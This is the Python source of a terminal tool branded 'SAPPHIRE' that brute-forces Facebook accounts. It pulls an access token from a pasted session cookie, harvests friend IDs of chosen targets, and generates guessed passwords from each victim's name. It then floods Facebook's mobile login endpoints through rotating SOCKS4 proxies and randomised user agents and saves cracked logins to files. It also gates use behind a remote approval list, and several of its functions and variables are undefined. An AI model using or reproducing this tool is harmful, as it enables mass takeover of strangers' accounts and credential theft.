#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Mr.KAUSAR]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
for x in range(1000):
    rr = random.randint
    rc = random.choice
    sapphire1 = f"Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
    sapphire2  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    sapphire3  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    sapphire4  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    sapphire5  = f"Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3; wv) AppleWebKit/537.36 (KHTML, like Gecko Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]"
    sapphire6 = f"Dalvik/2.1.0 (Linux; U; Android 10; TDW7832 Build/QP1A.190711.020)"
    sapphire7 = f"Mozilla/5.0 (Linux; Android 12; RMX2202 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"
    UserAgentss = str(rc([sapphire1,sapphire2,sapphire3,sapphire4,sapphire5,sapphire6, sapphire7]))
    ugen.append(UserAgentss)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/SAPPHIRE-XWD/GARRYS.git').text
		ua=open('ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('ua.txt','r').read().splitlines()
#-------------------[ P X]-------------------
try:
	proxylist= requests.get('https://raw.githubusercontent.com/SAPPHIRE-XWD/SAPPHIRE-Z/main/SAPPHIRE.txt').text
	open('socks4.txt','w').write(proxylist)
except Exception as e:
	basari_tamvan(f'{bas}Proxy_List_Basari')
prox=open('socks4.txt','r').read().splitlines()
#------------------[  INSTALLING MOUDLES ]-------------------#
def modules():
	os.system('clear')
	banner()
	info()
	print(' [\u001b[36m•\033[1;37m] Modules Are Being Installed ')
	time.sleep(2)
	os.system('termux-setup-storage')
	time.sleep(1)
	os.system('clear')
	banner()
	info()
	os.system('pip install rice')
	time.sleep(1)
	os.system('pip install rich')
	time.sleep(1)
	os.system('pip install requests')
	time.sleep(1)
	os.system('pip install stdiomask')
	time.sleep(1)
	os.system('pip install bs4')
	os.system('clear')
	banner()
	info()
	animation(' [\u001b[36m•\033[1;37m] Congratulations Modules Are Successfully Installed')
	linex()
	os.system('exit')
	time.sleep(2)
os.system('xdg-open https://www.facebook.com/profile.php?id=100057149474543')
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _KAUSAR_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
	
#------------------[Animation]------------------------------
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print('\033[1;37m--------------------------------------------------')
def cls():
	os.system('clear')
	banner()
	info()
def info():
	print(f"""\033[1;37m--------------------------------------------------
 Creator   : Sagar sapkota 
 Github    : SAPPHIRE-XWD
 Facebook  : Ac hl ys 
 Author: Sapphire-XD
\033[1;37m--------------------------------------------------""")
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
███████╗ █████╗ ██████╗ ██████╗ ██╗  ██╗██╗██████╗ ███████╗
██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║██║██╔══██╗██╔════╝
███████╗███████║██████╔╝██████╔╝███████║██║██████╔╝█████╗  
╚════██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══██║██║██╔══██╗██╔══╝  
███████║██║  ██║██║     ██║     ██║  ██║██║██║  ██║███████╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝""")
os.system('clear')
banner()
#---------------------[Approval]--------------------------------
def approval():
  os.system('git pull')
  time.sleep(1)
  uuid = str(os.geteuid())+"69"+str(os.geteuid())
  id = "SAPPHIRE-X-"+"".join(uuid)
  os.system('clear')
  banner()
  info()
  animation("\033[1;37m [\u001b[36m•\033[1;37m] This Is Paid Tool You Need Approval To Use This Tool \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m--------------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/SAPPHIRE-XWD/GARRYS/main/Approval.txt").text
    if id in httpCaht:
      animation(">> Congratulations Your Pass Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      animation(">> Sorry Your Pass Has Not Been Approved ");
      time.sleep(0.1)
      input(' >> Click Enter To Send Your Pass')
      os.system('xdg-open https://www.facebook.com/profile.php?id=100057149474543')
      time.sleep(1)
      exit()
  except: 
     animation(" >> ERROR  ")
     time.sleep(2)
     exit() 
approval()
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Check Your Internet Then Try Aging'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		info()
		asu = random.choice([m,k,h,b,u])
		#os.system("play-audio Login.mp3 ")
		cookie=input(f'\x1b[1;91m➢\x1b[1;96m➢\x1b[1;92m➢Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		#os.system("play-audio successful.mp3 ")
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython Garry.py');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		#os.system("play-audio error.mp3 ")
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mERROR BRO CHECK YOUR COOKIES ID')
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m Cookies Expired ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	_KAUSAR_(f'----------------------------------------------------------')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m PUBLIC CRACK')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m FIRST DUMP')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m RANDOM CRACK')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m CONTACT ME')
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m LOGOUT COOKIE & EXIT')
	_KAUSAR_(f"---------------------------------------------------------")
	_____KAUSAR_____ = input('\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣\x1b[1;92m ')
	if _____KAUSAR_____ in ['1']:
		#os.system(" Firsr_Follow_My_GitHub.mp3")
		F()
	if _____KAUSAR_____ in ['2']:
		#os.system(" Firsr_Follow_My_GitHub.mp3")
		P()
	if _____KAUSAR_____ in ['3']:
		#os.system(" Firsr_Follow_My_GitHub.mp3")
		os.system('https://github.com/SAPPHIRE-XWD/EXTRACTOR-SAPPHIRE.git')
		os.system('SAPPHIRE IS EVERYWHERE')
		os.system('cd SAPPHIRE-EXTRACTOR- && python minatox.py ')
	if _____KAUSAR_____ in ['4']:
		#os.system(" Firsr_Follow_My_GitHub.mp3")
		os.system('python minatox.py.')
	if _____KAUSAR_____ in ['5']:
		#os.system(" Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100057149474543') ")
	if _____KAUSAR_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;91m➣ चुज दा करेक्ट अप्सन ')
		back()
def error():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Sorry choose the correct option')
	time.sleep(2)
	back()
	
#---------------------[APPLICATION CHECKER]---------------------#
#def cek_apk(session,coki):
    #w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
   # sop = BeautifulSoup(w,"html.parser")
   # x = sop.find("form",method="post")
    #game = [i.text for i #in x.find_all#("h3")]
  #  if len(game)==0:
        #print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    #else:
        #print(f'\r[🎮] %s ☆ Your Active Apps ☆  #   :{WHITE}'%(GREEN))
        #for i in range(len(game)):#
           # print(f"\r#[%s%s] %s%s"%(N,i+1,game[i]#.replace#("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
  #  w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    #sop = BeautifulSoup(w,"html.parser")
    #x = sop.find("form",method="post")
    #game = [i.text for i in x.find_all("h3")]
   # if len(game)==0:
        #print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s       #    \n'%(N,M,N,M,N))
  #  else:
        #print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        #for i in range(len(game)):
            #print(f"\r[%s%s] %s%s"%(N,i+#1,game[i].replace("Kedaluwarsa#"," Kedaluwarsa"),N))
        #else:
            #print(#57*'-#')
#------------------------[Public working]-------------------------
def P():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		info()
		jum = int(input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Target Id Limit ➣ \x1b[1;92m'))
	except ValueError:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWRONG TYPE ')
		exit()
	if jum<1 or jum>100:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Type  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(h+' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ ENTER PUBLIC ID \x1b[1;91m[\x1b[1;92m'+str(yz)+'\x1b[1;91m] \x1b[1;92m➣ \x1b[1;96m')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v16.0'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Check Your Internet Connection')
			exit()
	try:
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Total Id ➣ \x1b[1;96m'+str(len(id)))
		Settings()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Check Your Internet Connection')
		back()
	except (KeyError,IOError):
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mIts not a public id \n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Check Your Id\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mThen Try Again')
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		info()
		try:
			print(f"\033[1;37m---------------------------------------------------------")
			fileX = input (' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Enter Your File ➣\x1b[1;34m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;96m TOTAL ID ➣ \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m New Old Mix')
	hu = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option !!')
		exit()
	
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Mobile [BEST]')
	hc = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     PASSWORD MENU     \033[40m\033[00m\n \x1b[1;91m➢\x1b[1;34m➣\x1b[1;34m➣ Manual Password \x1b[1;91m[SAPPHIRE-X]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Auto Password \x1b[1;34m[SAPPHIRE-Y] \x1b[1;34m[BEST]\n \x1b[1;34m➢\x1b[1;34m➣\x1b[1;34m➣ \x1b[1;34mChoice ➣ \x1b[1;34m')
	if pwplus in ["SAPPHIRE-X"]:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	info()
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mSAPPHIRE-X\033[34m\033[00m\x1b[1;34m❵\x1b[1;34m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;34m●')
	print(f"\x1b[1;91m [OAK] \x1b[1;92m TOTAL ID          \x1b[1;91m➢ \x1b[1;92m"+str(len(id)))
	print(f"\x1b[1;91m [OAK] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\x1b[1;91m [OAK] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f"\x1b[1;91m [OAK] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;34m❴\033[34m\033[1;30mSAPPHIRE-Y\033[34m\033[00m\x1b[1;34m❵\x1b[1;34m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;34m●\n')
	#os.system("play-audio stard.mp3 ")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('123456')
					pwv.append('@#@#@#')
					pwv.append(nmf+'1122')
					pwv.append(nmf+'@@@')
					pwv.append(nmf+'@')
					pwv.append(nmf+'@@')
					pwv.append(nmf+'@123@')
					pwv.append(nmf+'@1122@')
					pwv.append(nmf+'@1234@')
					pwv.append(nmf+'@#@#@#')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ CRACK COMPLETE ')
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ OK : {h}%s '%(ok))
	print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣  Main Manu \x1b[1;92m[Y]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mExit [T]')
	woi = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Have a great day or night🖤{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	#os.system("play-audio stard.mp3 ")
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}  \x1b[1;90m [\x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}\x1b[1;90m]  {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#os.system("play-audio cp.mp3 ")
				print(f'\r \x1b[1;32m SAPPHIRE-CP|{idf} | {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#os.system("play-audio AM.mp3 ")
				print(f'\r\x1b[1;32SAPPHIRE-OK|{idf} | {pw}{N}')
				cek_apk(session,coki)
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Dalvik/2.1.0 (Linux; U; Android 11; U505S Build/RP1A.200720.011)'
